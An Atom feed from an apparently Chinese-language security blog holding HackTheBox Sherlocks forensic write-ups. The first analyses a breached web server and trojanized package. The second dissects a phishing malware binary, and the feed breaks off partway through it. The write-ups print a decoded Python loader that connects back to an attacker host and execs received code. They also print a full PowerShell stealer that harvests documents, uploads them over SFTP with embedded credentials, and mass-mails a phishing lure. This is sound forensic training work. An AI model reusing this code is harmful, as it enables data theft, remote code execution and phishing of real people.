<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://xor37.github.io</id>
    <title>æè¥¿ç“œğŸ‰</title>
    <updated>2024-08-16T06:21:02.449Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://xor37.github.io"/>
    <link rel="self" href="https://xor37.github.io/atom.xml"/>
    <subtitle>å–œæ¬¢å°±ä¹° ä¸è¡Œå°±åˆ† å¤šå–çƒ­æ°´ å°‘åˆ·è§†é¢‘</subtitle>
    <logo>https://xor37.github.io/images/avatar.png</logo>
    <icon>https://xor37.github.io/favicon.ico</icon>
    <rights>All rights reserved 2024, æè¥¿ç“œğŸ‰</rights>
    <entry>
        <title type="html"><![CDATA[HackTheBox Sherlocks APTNightmare]]></title>
        <id>https://xor37.github.io/post/hackthebox-sherlocks-aptnightmare/</id>
        <link href="https://xor37.github.io/post/hackthebox-sherlocks-aptnightmare/">
        </link>
        <updated>2024-08-16T06:06:10.000Z</updated>
        <content type="html"><![CDATA[<h2 id="å‰è¨€">å‰è¨€</h2>
<p>å…¬å¸å†…çªç„¶å‡ºç°äº†å¤šå°æ¶æ„ç”µå­é‚®ä»¶ï¼Œæˆ‘ä»¬éœ€è¦è°ƒæŸ¥æ•´ä¸ªäº‹ä»¶çš„å‰å› åæœã€‚åŒ…æ‹¬æµé‡åˆ†æã€å†…å­˜åˆ†æã€æ—¥å¿—åˆ†æã€ç—…æ¯’åˆ†æã€‚</p>
<h2 id="èƒŒæ™¯">èƒŒæ™¯</h2>
<blockquote>
<p>We neglected to prioritize the robust security of our network and servers, and as a result, both our organization and our customers have fallen victim to a cyber attack. The origin and methods of this breach remain unknown. Numerous suspicious emails have been detected. In our pursuit of resolution, As an expert forensics investigator, you must be able to help us.</p>
</blockquote>
<h2 id="æ–‡ä»¶">æ–‡ä»¶</h2>
<ul>
<li>traffic.pcapng ï¼šWeb æœåŠ¡å™¨æµé‡ã€‚</li>
<li>Memory_WebServer.mem ï¼šWeb æœåŠ¡å™¨å†…å­˜è½¬å‚¨ã€‚</li>
<li>DiskImage_CEO-US.zipï¼š  CEO è®¡ç®—æœº C ç›˜çš„å…‹éš†ã€‚</li>
<li>Ubuntu_5.3.0-70-generic_profile.zip ï¼šåŒ…å« Ubuntu è®¡ç®—æœºä¸­çš„/bootå’Œ/toolsæ–‡ä»¶å¤¹</li>
</ul>
<h2 id="task-1">Task 1</h2>
<blockquote>
<p>What is the IP address of the infected web server?</p>
</blockquote>
<p>æœ€æ´»è·ƒçš„å°±æ˜¯ 192.168.1.5 ä¸ 192.168.1.3<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240814110201.png" alt="" loading="lazy"><br>
çœ‹è¿‡åè®®åˆ†æäº†ï¼ŒHTTP æµé‡å±…å¤šã€‚å…ˆçœ‹ä¸€ä¸‹ HTTP è¯·æ±‚ï¼Œé©¬ä¸Šå‘ç°å¼‚å¸¸è¯·æ±‚ï¼Œå®šä½åˆ°æ”»å‡»è¡Œä¸ºã€‚<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240814104532.png" alt="" loading="lazy"><br>
æœç´¢å…³é”®å­—å¾ˆå¿«å°±èƒ½å®šä½åˆ°ã€‚<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240814105133.png" alt="" loading="lazy"></p>
<h2 id="task-2">Task 2</h2>
<blockquote>
<p>What is the IP address of the Attacker?</p>
</blockquote>
<figure data-type="image" tabindex="1"><img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240814105133.png" alt="" loading="lazy"></figure>
<h2 id="task-3">Task 3</h2>
<p>æœåŠ¡ç«¯çŸ­æ—¶é—´å†…å‘å‘æ”»å‡»è€…å‘é€äº†å¾ˆå¤š RST/ACK åŒ…ï¼Œæ”»å‡»è€…å¯èƒ½åœ¨è¿›è¡Œ SYN æ‰«æã€‚<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240814111956.png" alt="" loading="lazy"><br>
é€šè¿‡æœåŠ¡ç«¯å›å¤ ACK çš„æƒ…å†µå°±èƒ½åˆ¤æ–­ç«¯å£æ˜¯å¦å¼€æ”¾ã€‚</p>
<pre><code class="language-bash">ip.dst == 192.168.1.5 &amp;&amp; ip.src == 192.168.1.3 &amp;&amp; tcp.flags.syn == 1 &amp;&amp; tcp.flags.ack == 1
</code></pre>
<p>è¿‡æ»¤åå¯¼å‡ºè‡³ CSV<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240814112325.png" alt="" loading="lazy"><br>
æ•°æ®å¤„ç†å°±äº¤ç»™ AI å§<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240814113544.png" alt="" loading="lazy"></p>
<h2 id="task-4">Task 4</h2>
<blockquote>
<p>What are the first five ports identified by the attacker in numerical order during the enumeration phase, not considering the sequence of their discovery?</p>
</blockquote>
<p>å¥‡æ€ªçš„é—®é¢˜ï¼Œå°±æ˜¯æŒ‰é¡ºåºæ•°å‰äº”ä¸ªç«¯å£ã€‚</p>
<h2 id="task-5">Task 5</h2>
<blockquote>
<p>The attacker exploited a misconfiguration allowing them to enumerate all subdomains. This misconfiguration is commonly referred to as (e.g, Unrestricted Access Controls)?</p>
</blockquote>
<p>èƒ½æšä¸¾æ‰€æœ‰å­åŸŸåçš„åº”è¯¥æ˜¯åŒºåŸŸä¼ è¾“ï¼Œåœ¨æ•°æ®åŒ…é‡Œä¹Ÿå‘ç°äº†è¿™æ ·çš„æµé‡ã€‚<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240814114113.png" alt="" loading="lazy"></p>
<h2 id="task-6">Task 6</h2>
<blockquote>
<p>How many subdomains were discovered by the attacker?</p>
</blockquote>
<p>æ‰¾åˆ°åŒºåŸŸä¼ è¾“çš„æ•°æ®åŒ…ï¼Œæ•°ä¸€ä¸‹ A è®°å½•ã€‚<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240814114257.png" alt="" loading="lazy"></p>
<h2 id="task-7">Task 7</h2>
<blockquote>
<p>What is the compromised subdomain (e.g., dev.example.com) ?</p>
</blockquote>
<p>æ‰¾åˆ°æ”»å‡»çš„åŒ…ï¼ŒæŸ¥çœ‹ Originã€‚<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240814114524.png" alt="" loading="lazy"></p>
<h2 id="task-8">Task 8</h2>
<blockquote>
<p>What email address and password were used to log in (e.g., user@example.com:password123)?</p>
</blockquote>
<p>æ”»å‡»è€…ä¸€ç›´åœ¨è¯·æ±‚ index.phpï¼Œä»è¯·æ±‚å†…å®¹çœ‹ä¹Ÿæ˜¯åœ¨çˆ†ç ´å¯†ç ã€‚<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240814115706.png" alt="" loading="lazy"><br>
åªéœ€è¦æ‰¾åˆ°ä¸æ˜¯ index.php çš„æ—¶å€™ï¼Œè¯æ˜ä»–å¯èƒ½ç™»é™†æˆåŠŸäº†ã€‚</p>
<pre><code class="language-bash">ip.addr == 192.168.1.5 &amp;&amp; ip.addr == 192.168.1.3 &amp;&amp; http.request &amp;&amp;http.host == &quot;sysmon.cs-corp.cd&quot; &amp;&amp; !http.request.uri contains &quot;index.php&quot;
</code></pre>
<p><img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240814134022.png" alt="" loading="lazy"><br>
è·Ÿè¸ªæµå¯ä»¥çœ‹åˆ°æ­£ç¡®çš„å¯†ç <br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240814134516.png" alt="" loading="lazy"></p>
<h2 id="task-9">Task 9</h2>
<blockquote>
<p>What command gave the attacker their initial access ?</p>
</blockquote>
<p>è¿™é‡Œæ‰§è¡Œå®Œä¹‹åï¼ŒæœåŠ¡å™¨çš„ 5555 ç«¯å£å°±è·Ÿæ”»å‡»è€…å»ºç«‹é“¾æ¥äº†ã€‚<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240814144614.png" alt="" loading="lazy"></p>
<h2 id="task-10">Task 10</h2>
<blockquote>
<p>What is the CVE identifier for the vulnerability that the attacker exploited to achieve privilege escalation (e.g, CVE-2016-5195) ?</p>
</blockquote>
<p>å¯ä»¥çœ‹åˆ°ä½¿ç”¨äº† PwnKit.sh å°±å®ç°äº†ææƒã€‚</p>
<blockquote>
<p>PwnKit.sh æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„æ¼æ´åˆ©ç”¨å·¥å…·ï¼Œä¸“é—¨é’ˆå¯¹ CVE-2021-4034 è¿™ä¸ªæ¼æ´ã€‚<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240814145424.png" alt="" loading="lazy"></p>
</blockquote>
<h2 id="task-11">Task 11</h2>
<blockquote>
<p>What is the MITRE ID of the technique used by the attacker to achieve persistence (e.g, T1098.001)?</p>
</blockquote>
<p>é€šè¿‡ crontab è¿›è¡Œæƒé™ç»´æŒã€‚<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240814145727.png" alt="" loading="lazy"></p>
<h2 id="task-12">Task 12</h2>
<blockquote>
<p>The attacker tampered with the software hosted on the 'download' subdomain with the intent of gaining access to end-users. What is the Mitre ATT&amp;CK technique ID for this attack?</p>
</blockquote>
<p>çœ‹æè¿°å°±çŸ¥é“æ˜¯ä¾›åº”é“¾æ”»å‡»ï¼ŒT1195.002.</p>
<h2 id="task-13">Task 13</h2>
<blockquote>
<p>What command provided persistence in the cs-linux.deb file?</p>
</blockquote>
<p>å…ˆæŠŠ cs-linux.deb å¯¼å‡ºæ¥ï¼Œè§£å‹ï¼Œæ‹¿åˆ°ä»£ç ã€‚<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/2024-08-14%2015.56.41.png" alt="" loading="lazy"></p>
<pre><code class="language-python">#!/usr/bin/env python3

exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eJw9UN9LwzAQfl7+irCHNcEsrqMbOmxBxAcRGTjfRKRNT1uaJiWXaqfo325Dh/dwx3f33Xc/6razzlO0qgEvvnRdiCJH2CYCveuVF75uQVgkxKLEI3po2RxUZanCpa5NP9DFgmYZ/T2XY2Pl1JyTN+voQGtDXW7egcUrviMz746jn2E6zZJTYGtxwof9zf3r4enx9vqBB55U1hhQnrEovlzLeHshY7mJRDIaD4zCQd6QGQwKOh+kw6oSNUDHNpzodLpA9qbLVcOi7C4SKB2oDzYKPK9eSJmesObks6o1UA2GlfxKj3Ll2X91OaU5gQEUC0+SJSjbdg4Q2fQvWWyTkCwhMMV3hNEOfzj5Axx7baM=')[0])))

</code></pre>
<p>è§£ç ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯é€šè¿‡å†™å…¥ ~/.bashrc åšæƒé™ç»´æŒçš„ã€‚</p>
<pre><code class="language-python">import socket,zlib,base64,struct,time,os

os.system(&quot;echo cs-linux &amp;&amp; &gt;&gt; ~/.bashrc&quot;)
for x in range(10):
	try:
			s=socket.socket(2,socket.SOCK_STREAM)
			s.connect(('192.168.1.5',4444))
			break
	except:
			time.sleep(5)
l=struct.unpack('&gt;I',s.recv(4))[0]
d=s.recv(l)
while len(d)&lt;l:
        d+=s.recv(l-len(d))
exec(zlib.decompress(base64.b64decode(d)),{'s':s})
</code></pre>
<h2 id="task-14">Task 14</h2>
<blockquote>
<p>The attacker sent emails to employees, what the name for the running process that allowed this to occur?</p>
</blockquote>
<p>éœ€è¦åˆ†æè¿›ç¨‹äº†ï¼Œè¿™é‡Œé€šè¿‡å†…å­˜è½¬å‚¨æ–‡ä»¶ Memory_WebServer.mem è¿›è¡Œåˆ†æã€‚ä½†æ˜¯ Volatility ä¸€ç›´å¤±è´¥ï¼Œåªèƒ½ä¸Š strings å¤§æ³•äº†ã€‚ä½†æ•°æ®é‡è¿˜æ˜¯å¾ˆå¤šï¼Œ1120w è¡Œçš„æ•°æ®æ²¡æ³•ç¿»çœ‹ã€‚<br>
ä¸€èˆ¬ Linux æœåŠ¡ä¼šæœ‰ä¸€ä¸ªä¸“å±ç”¨æˆ·ç”¨äºè¿è¡Œè¿™ä¸ªè¿›ç¨‹ï¼Œæ¯”å¦‚ nginx ç”¨æˆ·ã€‚æˆ‘ä»¬å¯ä»¥å»æµé‡åŒ…é‡Œæ‰¾åˆ°ä¹‹å‰çš„ /etc/passwdï¼Œæœ‰æ¦‚ç‡å¯ä»¥å‘ç°é‚®ä»¶æœåŠ¡æ˜¯ä»€ä¹ˆã€‚<br>
ä»åå¾€å‰äº†è§£ï¼Œcitadel æ­£å¥½å°±æ˜¯ååŒæœåŠ¡ï¼ŒåŒ…å«é‚®ä»¶æœåŠ¡ã€‚<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240814162723.png" alt="" loading="lazy"><br>
ä½†ç›´æ¥å¡« citadel æ˜¯é”™è¯¯çš„ï¼Œä¼°è®¡æœ‰æœåŠ¡ç«¯ï¼Ÿæœ€å¿«çš„è¿˜æ˜¯é—® AIã€‚<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240814163254.png" alt="" loading="lazy"></p>
<h2 id="task-15">Task 15</h2>
<blockquote>
<p>We received phishing email can you provide subject of email ?</p>
</blockquote>
<figure data-type="image" tabindex="2"><img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240814164020.png" alt="" loading="lazy"></figure>
<h2 id="task-16">Task 16</h2>
<blockquote>
<p>What is the name of the malicious attachment?</p>
</blockquote>
<p>ç›´æ¥æœ attachment å¤ªå¤šäº†ï¼Œè¿˜æ˜¯æœä¸»é¢˜ Revised Privacy Policy å†æ‰¾åˆ°é™„ä»¶åã€‚</p>
<pre><code class="language-php">Content-disposition: attachment; filename=&quot;policy.docm&quot;
</code></pre>
<h2 id="task-17">Task 17</h2>
<blockquote>
<p>Please identify the usernames of the CEOs who received the attachment.</p>
</blockquote>
<p>è¿™é‡Œç›´æ¥æœç´¢ To: &quot;ceo æ²¡æœ‰ç»“æœï¼Œæœç´¢ From: &quot;ceo æ‰æœ‰ç»“æœã€‚å¯èƒ½æ˜¯æ”¶åˆ°é™„ä»¶çš„ CEO ä¸­æ¯’åä¼šè‡ªåŠ¨å‘æ¶æ„é‚®ä»¶ç»™å…¶ä»–äººå§ã€‚</p>
<h2 id="task-18">Task 18</h2>
<blockquote>
<p>What is the hostname for the compromised CEO?</p>
</blockquote>
<p>ä¸»æœºååº”è¯¥åœ¨ DiskImage_CEO-US.zip ä¼šå®¹æ˜“è·å–ã€‚<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240814165728.png" alt="" loading="lazy"></p>
<h2 id="task-19">Task 19</h2>
<blockquote>
<p>What is the full path for the malicious attachment?</p>
</blockquote>
<p>è¿™é‡Œéœ€è¦å˜æˆåæ–œæ æ‰èƒ½æäº¤æˆåŠŸï¼ˆå¥½å‘ï¼‰<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240814170540.png" alt="" loading="lazy"></p>
<h2 id="task-20">Task 20</h2>
<blockquote>
<p>Can you provide the command used to gain initial access?</p>
</blockquote>
<p>Windows æ‰§è¡Œå‘½ä»¤ä¸€èˆ¬ä¼šè°ƒç”¨ cmd.exe æˆ– powershell.exeï¼Œä½†ç›´æ¥æœç´¢æŸ¥ä¸åˆ°ã€‚<br>
é€šè¿‡ Windows æ—¥å¿—å¯ä»¥çœ‹åˆ°ï¼Œpowershell ä¸‹è½½äº† http://192.168.1.5:806/a å¹¶æ‰§è¡Œã€‚<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240814173354.png" alt="" loading="lazy"></p>
<h2 id="task-21">Task 21</h2>
<blockquote>
<p>Provide a Popular threat label for the malicious executable used to gain initial access?</p>
</blockquote>
<p>è¦è§£ç­”è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘éœ€è¦çŸ¥é“  http://192.168.1.5:806/a çš„å†…å®¹ã€‚æˆ‘ä»¬å¯ä»¥åœ¨æµé‡åŒ…é‡Œæ‰¾åˆ°å®ƒã€‚<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240814174633.png" alt="" loading="lazy"><br>
CyberChef è§£ç ä¸€ä¸‹ï¼Œçœ‹èµ·æ¥å…·ä½“çš„ shellcode æ˜¯è¿™ä¸ªè¢« xor35 å¤„ç†è¿‡çš„ Base64 å­—ç¬¦ä¸²ã€‚<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240814180451.png" alt="" loading="lazy"><br>
CyberChef è§£ç å‡ºé”™ï¼Œå†™ä¸ªè„šæœ¬è§£ä¸€ä¸‹ã€‚åº”è¯¥æ˜¯ç—…æ¯’æœ¬ä½“äº†ï¼Œæ‰”åˆ° Virustotal åˆ†æä¸€ä¸‹ã€‚<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240815102633.png" alt="" loading="lazy"><br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240815102854.png" alt="" loading="lazy"></p>
<h2 id="task-22">Task 22</h2>
<blockquote>
<p>What is the payload type?</p>
</blockquote>
<p>è¿™éœ€è¦æˆ‘ä»¬å¯¹ cs ç—…æ¯’åšæ ·æœ¬åˆ†æã€‚Google æ‰¾åˆ°äº†ä¸€ä¸ªèƒ½è§£æ cs çš„è„šæœ¬ https://isc.sans.edu/diary/Analysis+of+an+Encoded+Cobalt+Strike+Beacon/29014<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240815114209.png" alt="" loading="lazy"></p>
<h2 id="task-23">Task 23</h2>
<blockquote>
<p>What is task name has been add by attacker?</p>
</blockquote>
<p>ç›´æ¥å» C:\Windows\System32\Tasks ä¸‹å¯»æ‰¾å³å¯ï¼ŒC:\Users\Public ä¸‹çš„ WindowsUpdate.exe å¾ˆä¸æ­£å¸¸ã€‚åº”è¯¥æ˜¯æ”»å‡»è€…å¸ƒç½®çš„ã€‚<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240815114640.png" alt="" loading="lazy"><br>
å®Œç»“æ’’èŠ± ğŸ‰<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/2024-08-15%2011.48.27.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[HackTheBox Heartbreaker-Continuum]]></title>
        <id>https://xor37.github.io/post/hackthebox-heartbreaker-continuum/</id>
        <link href="https://xor37.github.io/post/hackthebox-heartbreaker-continuum/">
        </link>
        <updated>2024-08-13T07:15:43.000Z</updated>
        <content type="html"><![CDATA[<h2 id="å‰è¨€">å‰è¨€</h2>
<p>æ­å¼€ç—…æ¯’åˆ†æçš„è¿·é›¾ï¼Œå›ç­”å®˜æ–¹æå‡ºçš„é—®é¢˜ï¼Œäº†è§£è¿™ä¸ªç—…æ¯’çš„å·¥ä½œåŸç†ã€‚</p>
<h2 id="èƒŒæ™¯">èƒŒæ™¯</h2>
<blockquote>
<p>Following a recent report of a data breach at their company, the client submitted a potentially malicious executable file. The file originated from a link within a phishing email received by a victim user. Your objective is to analyze the binary to determine its functionality and possible consequences it may have on their network. By analyzing the functionality and potential consequences of this binary, you can gain valuable insights into the scope of the data breach and identify if it facilitated data exfiltration. Understanding the binary's capabilities will enable you to provide the client with a comprehensive report detailing the attack methodology, potential data at risk, and recommended mitigation steps.</p>
</blockquote>
<h2 id="task-1">Task 1</h2>
<blockquote>
<p>To accurately reference and identify the suspicious binary, please provide its SHA256 hash.</p>
</blockquote>
<p>Virustotal èƒ½è·å–å¾ˆå¤šå…³äºè¿™ä¸ªç—…æ¯’çš„ä¿¡æ¯ã€‚<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240813140753.png" alt="" loading="lazy"></p>
<h2 id="task-2">Task 2</h2>
<blockquote>
<p>When was the binary file originally created, according to its metadata (UTC)?</p>
</blockquote>
<figure data-type="image" tabindex="1"><img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240813141115.png" alt="" loading="lazy"></figure>
<h2 id="task-3">Task 3</h2>
<blockquote>
<p>Examining the code size in a binary file can give indications about its functionality. Could you specify the byte size of the code in this binary?</p>
</blockquote>
<figure data-type="image" tabindex="2"><img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240813141315.png" alt="" loading="lazy"></figure>
<h2 id="task-4">Task 4</h2>
<blockquote>
<p>It appears that the binary may have undergone a file conversion process. Could you determine its original filename?</p>
</blockquote>
<figure data-type="image" tabindex="3"><img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240813142636.png" alt="" loading="lazy"></figure>
<h2 id="task-5">Task 5</h2>
<blockquote>
<p>Specify the hexadecimal offset where the obfuscated code of the identified original file begins in the binary.</p>
</blockquote>
<p>è¿™é‡Œé€šè¿‡ 16 è¿›åˆ¶ç¼–è¾‘å™¨å°±èƒ½çœ‹åˆ°ï¼Œç°å®çš„ç—…æ¯’å¯èƒ½éœ€è¦å„ç§é€†å‘åˆ†æã€‚<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240813142952.png" alt="" loading="lazy"></p>
<h2 id="task-6">Task 6</h2>
<blockquote>
<p>The threat actor concealed the plaintext script within the binary. Can you provide the encoding method used for this obfuscation?</p>
</blockquote>
<p>æŠŠä»£ç æå–å‡ºæ¥ï¼Œå¯ä»¥çœ‹åˆ°å­—ç¬¦ç¿»è½¬ã€Base64ã€å­—ç¬¦æ‹¼æ¥çš„è¡Œä¸ºã€‚é—®çš„æ˜¯ç¼–ç ï¼Œé‚£å°±æ˜¯ Base64 äº†ã€‚<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240813143620.png" alt="" loading="lazy"></p>
<h2 id="task-7">Task 7</h2>
<blockquote>
<p>What is the specific cmdlet utilized that was used to initiate file downloads?</p>
</blockquote>
<p>è¿˜åŸä¸Šé¢çš„æ¶æ„ä»£ç </p>
<pre><code class="language-bash">$hostname = $env:COMPUTERNAME
$currentUser = $env:USERNAME
$url = &quot;http://44.206.187.144:9000/Superstar_MemberCard.tiff&quot;
$img = &quot;C:\users\$currentUser\Downloads\Superstar_MemberCard.tiff&quot;

Invoke-WebRequest -Uri $url -OutFile $img
Start-Process $img

$searchDir = &quot;C:\Users&quot;
$targetDir = &quot;C:\Users\Public\Public Files&quot;

if (-not (Test-Path -Path $targetDir -PathType Container)) {
    New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
}

$currentUser | Out-File -FilePath (Join-Path $targetDir 'username.txt') -Force

nltest /dsgetdc:$env:USERDOMAIN 2&gt;$null | Out-File -FilePath (Join-Path $targetDir 'DCinfo.txt') -Force
Get-WmiObject -Class Win32_UserAccount | Out-File -FilePath (Join-Path $targetDir 'localusers.txt') -Force
wmic /NAMESPACE:\\root\SecurityCenter2 PATH AntiVirusProduct GET /value 2&gt;$null | Out-File -FilePath (Join-Path $targetDir 'AVinfo.txt') -Force

$currentUserProcesses = Get-WmiObject Win32_Process | Where-Object {
    try {
        $_.GetOwner().User -eq $currentUser
    } catch {
        $false  
    }
}

$currentUserProcesses | Select-Object ProcessName, ProcessId | Out-File -FilePath (Join-Path $targetDir 'UserProcesses.txt') -Force

if (Get-Process -Name Outlook -ErrorAction SilentlyContinue) {
    Stop-Process -Name Outlook -Force -ErrorAction SilentlyContinue
}

$extList =  &quot;*.doc&quot;, &quot;*.docx&quot;, &quot;*.xls&quot;, &quot;*.xlsx&quot;, &quot;*.ppt&quot;, &quot;*.pptx&quot;, &quot;*.pdf&quot;, &quot;*.csv&quot;, &quot;.*oft&quot;, &quot;*.potx&quot;, 
            &quot;*.xltx&quot;, &quot;*.dotx&quot;, &quot;*.msg&quot;, &quot;*.eml&quot;, &quot;*.pst&quot;,  &quot;*.odt&quot;, &quot;*.ods&quot;, &quot;*.odp&quot;, &quot;*.odg&quot;, &quot;*.ost&quot;
             
$null = Get-ChildItem $searchDir -Recurse -Include $extList -Force -ErrorAction 'SilentlyContinue' |
    ForEach-Object {
        $destinationPath = Join-Path $targetDir $_.Name
        
        if ($_.FullName -ne $destinationPath) {
            Copy-Item -Path $_.FullName -Destination $destinationPath -Force
        }
    }

Get-SmbShare | Out-File -FilePath (Join-Path $targetDir 'Shareinfo.txt') -Force
gpresult /r | Out-File -FilePath (Join-Path $targetDir 'GPinfo.txt') -Force
$ProgressPreference = 'SilentlyContinue'
$archivePath = &quot;$targetDir\$hostname.zip&quot;
Compress-Archive -Path $targetDir -DestinationPath $archivePath -Force 

$wZipUrl = &quot;https://us.softradar.com/static/products/winscp-portable/distr/0/winscp-portable_softradar-com.zip&quot;
$wZipFile = &quot;$targetDir\WinSCP.zip&quot;
$wExtractPath = &quot;C:\Users\Public\HelpDesk-Tools&quot;

Invoke-WebRequest -UserAgent &quot;Wget&quot; -Uri $wZipUrl -OutFile $wZipFile -UseBasicParsing
Expand-Archive -Path $wZipFile -DestinationPath $wExtractPath -Force

$wExePath = &quot;$wExtractPath\WinSCP.com&quot;
$sPath = &quot;$wExtractPath\maintenanceScript.txt&quot;
@&quot;
open sftp://service:M8&amp;C!i6KkmGL1-#@35.169.66.138/ -hostkey=*
put `&quot;$archivePath`&quot;
close
exit
&quot;@ | Out-File -FilePath $sPath -Force
Start-Process -FilePath $wExePath -ArgumentList &quot;/script=`&quot;$sPath`&quot;&quot; -Wait -NoNewWindow


$outlookPath  = Get-ChildItem -Path &quot;C:\Program Files\Microsoft Office&quot; -Filter &quot;OUTLOOK.EXE&quot; -Recurse | Select-Object -First 1 -ExpandProperty FullName

$htmlBody = @&quot;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;style&gt;
    body {
    font-family: Calibri, sans-serif;
    }
&lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;p&gt;Hey, &lt;/p&gt; &lt;p&gt; Hope you're doing great when you see this. I'm reaching out because there's something I've been wanting to share with you. You know that feeling when you've been admiring someone from afar, but hesitated to take the next step? That's been me lately, but I've decided it's time to change that.&lt;/p&gt;
&lt;p&gt;In a world where we often rush through everything, I believe in the beauty of taking things slow, cherishing each moment like a scene from a timeless tale. So, if you're open to it, I'd love for us to meet up after hours.&lt;/p&gt;
&lt;p&gt;I've arranged for a rendezvous at a private membership club, where we can enjoy a bit of privacy and exclusivity. I've attached the map for your convenience. &lt;/p&gt;
&lt;p&gt;To gain entry, you'll need a digital membership card for entry, accessible &lt;a href='http://44.206.187.144:9000/Superstar_MemberCard.tiff.exe'&gt;here&lt;/a&gt;. Just a friendly heads up, there's a time limit before you can download it, so it's best to grab it sooner rather than waiting too long.&lt;/p&gt;
&lt;p&gt;Counting on seeing you there later.&lt;/p&gt;
&lt;/body&gt;
&lt;/html&gt;
&quot;@

if ($outlookPath) {
    Start-Process -FilePath $outlookPath
    $outlook = New-Object -ComObject Outlook.Application
    $namespace = $outlook.GetNamespace(&quot;MAPI&quot;)
    $contactsFolder = $namespace.GetDefaultFolder(10) 
    $csvFilePath = &quot;$targetDir\Contacts.csv&quot;
    $contactsFolder.Items | ForEach-Object {
        $_.GetInspector | ForEach-Object {
            $_.Close(0)  
        }
        $props = @{
            'Full Name'      = $_.FullName
            'Email Address'  = $_.Email1Address
            
        }
        New-Object PSObject -Property $props
    } | Export-Csv -Path $csvFilePath -NoTypeInformation

    $contacts = Import-Csv -Path $csvFilePath
    $mailItem = $outlook.CreateItem(0)
    $mailItem.Subject = &quot;Fingers crossed you'll notice..&quot;
    $mailItem.HtmlBody = $htmlBody
    $mailItem.Attachments.Add($img) &gt; $null
    $mailItem.BodyFormat = 2 

    foreach ($contact in $contacts) {
        $bccRecipient = $mailItem.Recipients.Add($contact.&quot;Email Address&quot;)
        $bccRecipient.Type = [Microsoft.Office.Interop.Outlook.OlMailRecipientType]::olBCC
    }

    $mailItem.Recipients.ResolveAll() &gt; $null
    $mailItem.Send()
}

Remove-Item -Path $wExtractPath -Recurse -Force
Remove-Item -Path $targetDir -Recurse -Force

</code></pre>
<p>å¯ä»¥çœ‹åˆ°</p>
<pre><code class="language-bash">Invoke-WebRequest -Uri $url -OutFile $img
</code></pre>
<h2 id="task-8">Task 8</h2>
<blockquote>
<p>Could you identify any possible network-related Indicators of Compromise (IoCs) after examining the code? Separate IPs by comma and in ascending order.</p>
</blockquote>
<p>CyberChef ç›´æ¥æå– IP<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240813144437.png" alt="" loading="lazy"></p>
<h2 id="task-9">Task 9</h2>
<blockquote>
<p>The binary created a staging directory. Can you specify the location of this directory where the harvested files are stored?</p>
</blockquote>
<p>é˜…è¯»æ¶æ„ä»£ç å¯çŸ¥</p>
<pre><code class="language-bash">$targetDir = &quot;C:\Users\Public\Public Files&quot;
</code></pre>
<h2 id="task-10">Task 10</h2>
<blockquote>
